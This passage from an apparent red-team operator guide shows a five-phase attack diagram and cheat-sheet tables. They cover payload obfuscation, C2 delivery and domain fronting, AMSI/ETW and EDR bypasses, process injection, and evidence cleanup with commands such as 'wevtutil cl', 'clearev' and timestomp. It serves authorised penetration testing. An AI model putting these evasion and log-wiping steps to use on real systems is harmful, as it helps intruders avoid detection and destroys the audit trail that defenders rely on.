│  │ MSF:     msfvenom -e x64/xor_dynamic -i 5                  │ │
│  │                                                             │ │
│  │ Kali:    UPX pack + donut shellcode conversion              │ │
│  └─────────────────────────────────────────────────────────────┘ │
│                              ↓                                    │
│  PHASE 2: DELIVER                                                │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │ Redirector: SOCAT/Nginx hiding C2 IP                       │ │
│  │                                                             │ │
│  │ Domain Fronting: CDN with host-header spoof                 │ │
│  │                                                             │ │
│  │ DNS C2: dnscat2 or Sliver DNS listener                      │ │
│  │                                                             │ │
│  │ Stager: Small initial payload → pull full implant          │ │
│  └─────────────────────────────────────────────────────────────┘ │
│                              ↓                                    │
│  PHASE 3: EXECUTE                                               │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │ AMSI Bypass:   Sliver armory / MSF amsi_bypass              │ │
│  │                                                             │ │
│  │ ETW Patch:     Disable event tracing                        │ │
│  │                                                             │ │
│  │ Process:       Migrate to explorer.exe / svchost.exe        │ │
│  │                                                             │ │
│  │ Execution:     execute-assembly / sideload (memory-only)    │ │
│  └─────────────────────────────────────────────────────────────┘ │
│                              ↓                                    │
│  PHASE 4: PERSIST / C2                                          │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │ Beacon Mode:   Sliver beacon 600 --jitter 40                │ │
│  │                                                             │ │
│  │ WireGuard:     Encrypted tunnel, looks like VPN             │ │
│  │                                                             │ │
│  │ LOTL:          Use certutil / PowerShell for comms          │ │
│  │                                                             │ │
│  │ P2P:           SMB beacons / named pipes for lateral        │ │
│  └─────────────────────────────────────────────────────────────┘ │
│                              ↓                                    │
│  PHASE 5: CLEANUP                                                │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │ Logs:          clearev / wevtutil cl                        │ │
│  │                                                             │ │
│  │ Files:         rm / shred / srm                             │ │
│  │                                                             │ │
│  │ Timestamps:     timestomp / touch -r                        │ │
│  │                                                             │ │
│  │ Memory:        die / exit cleanly                           │ │
│  └─────────────────────────────────────────────────────────────┘ │
│                                                                   │
└──────────────────────────────────────────────────────────────────┘
```

---

---

## Quick Reference Cheat Sheet

### AMSI Bypass Priority

| Technique | Stealth | Reliability | Notes |
|-----------|---------|-------------|-------|
| Memory patch (ntdll) | Low | High | Detectable via unhook detection |
| .NET assembly load | Medium | High | Preferred method |
| Disable AMSI via registry | Very Low | High | Loud, admin required |

### EDR Bypass Priority

| Technique | Stealth | Complexity | Notes |
|-----------|---------|------------|-------|
| Direct syscalls | High | High | Use SysWhispers3 |
| sRDI | High | Medium | Works well for DLL implants |
| Unhooking | Medium | Low | Patch visible to EDR |
| Kernel callback removal | Very High | Very High | Dangerous, kernel level |

### Process Injection Priority

| Technique | Stealth | Compatibility | Notes |
|-----------|---------|---------------|-------|
| DLL Injection (CreateRemoteThread) | Medium | Universal | Most common |
| APC Injection | High | Windows Vista+ | Alertable threads only |
| Process Hollowing | Medium | Universal | Legit process child |
| Thread Hijacking | High | Windows Vista+ | Complex, high skill |

### Network Evasion Priority

| Technique | Stealth | Setup Cost | Notes |
|-----------|---------|------------|-------|
| Domain fronting | Very High | Medium | CDN required |
| HTTPS with valid cert | High | Low | LetsEncrypt works |
| DNS tunneling | Medium | Medium | Slow, exfil only |
| HTTPS over port 443 | High | Low | Standard, no special config |

---

## Related Guides

- [[Red Team Engagement Guide]] — Full engagement methodology
- [[Sliver C2 - Red Team Operator Guide]] — C2 setup and opsec
- [[Metasploit 101]] — Framework basics and module usage
- [[Cobalt Strike for Red Teams]] — Advanced C2 techniques

---

> **📝 Notes**
> - This guide focuses on Windows-centric techniques; macOS/Linux evasion is covered in dedicated guides
> - Detection signatures evolve rapidly—verify techniques against current EDR versions before engagement
> - Always document which bypasses worked for post-engagement reporting
